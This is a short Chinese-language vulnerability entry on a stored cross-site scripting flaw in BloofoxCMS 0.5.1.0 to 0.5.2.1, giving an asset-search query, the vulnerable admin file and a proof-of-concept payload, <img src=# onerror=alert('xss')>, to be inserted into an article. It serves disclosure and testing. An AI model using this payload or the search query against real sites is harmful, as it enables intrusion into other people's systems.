# BloofoxCMS 0.5.2.1 存储型XSS

## 漏洞描述

参考链接：

- https://packetstormsecurity.com/files/161195

## 漏洞影响

```
BloofoxCMS 0.5.1.0 -.5.2.1
```

## 网络测绘

```
app="BloofoxCMS"
```

## 漏洞复现

漏洞文件：

```
/admin/include/inc_content_articles.php
```

登录有效的账号，在添加文章的时候插入Payload发布，每次访问均可触发：

```
<img src=# onerror=alert('xss')>
```

